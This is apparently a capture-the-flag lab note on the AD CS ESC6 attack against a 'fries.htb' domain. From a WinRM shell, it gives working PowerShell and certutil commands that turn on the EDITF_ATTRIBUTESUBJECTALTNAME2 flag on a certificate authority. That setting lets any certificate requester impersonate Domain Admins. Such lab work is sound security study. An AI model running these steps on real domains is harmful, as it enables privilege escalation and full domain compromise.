ESC6 — *EDITF_ATTRIBUTESUBJECTALTNAME2*

Principle: Enables the ability to specify an arbitrary Subject Alternative Name (SAN) in certificate requests.

## Configuration with COM API

#WinRM_Shell 

```Powershell
# Using CertificateAuthority.Admin COM object 

$CA = New-Object -ComObject CertificateAuthority.Admin 
$Config = "DC01.fries.htb\fries-DC01-CA" 
# Calculate the new value 
$current = 1114446  # Current value 
$new = $current -bor 0x00040000
# Add EDITF_ATTRIBUTESUBJECTALTNAME2 flag (262144) 
# New value = 1376590 (0x15014E) # Apply modification 
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new) 
# Restart CA service Restart-Service certsvc -Force
```

## Verification

#WinRM_Shell 

```Powershell
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
```

![[EDITF_ATTRIBUTESUBJECTALTNAME2.png]]

### Analysis of EditFlags Value: `0x15014e` (1376590)

**CRITICAL FINDING: ESC6 Vulnerability Confirmed! 🚨**

The flag `EDITF_ATTRIBUTESUBJECTALTNAME2` (0x40000) **IS NOW ENABLED**.

This means the CA **IS vulnerable to ESC6**, which allows any user who can request a certificate to specify arbitrary Subject Alternative Names (SANs), potentially allowing you to impersonate any user in the domain, including Domain Admins.

**Next step:** [[ESC16 — Disable Extension List]]
